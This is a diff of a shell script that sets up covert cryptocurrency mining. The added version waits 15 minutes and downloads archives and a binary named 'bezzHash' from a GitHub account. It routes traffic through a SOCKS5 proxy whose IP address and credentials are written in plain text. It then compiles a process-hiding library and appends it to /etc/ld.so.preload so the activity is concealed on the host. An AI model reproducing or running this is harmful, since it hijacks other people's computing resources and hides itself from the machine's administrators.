@@ -1,33 +1,42 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz
-tar -xvf lolMiner_v1.51a_Lin64.tar.gz
-cd 1.51a 
+#!/bin/sh
+sleep 15m
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
-wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-
 listen = :2233
-
 loglevel = 1
-
-socks5 = 45.140.13.119:9132
-
-socks5_username = faraddd8x
-
-socks5_password = faraddd8x
-
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
+echo " "
+echo " "
+
+echo " "
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
+echo " "
 
 echo " "
 
+echo " "
+echo " "
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user teguhcong.$(echo $(shuf -i 1-999 -n 1)-T4)
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
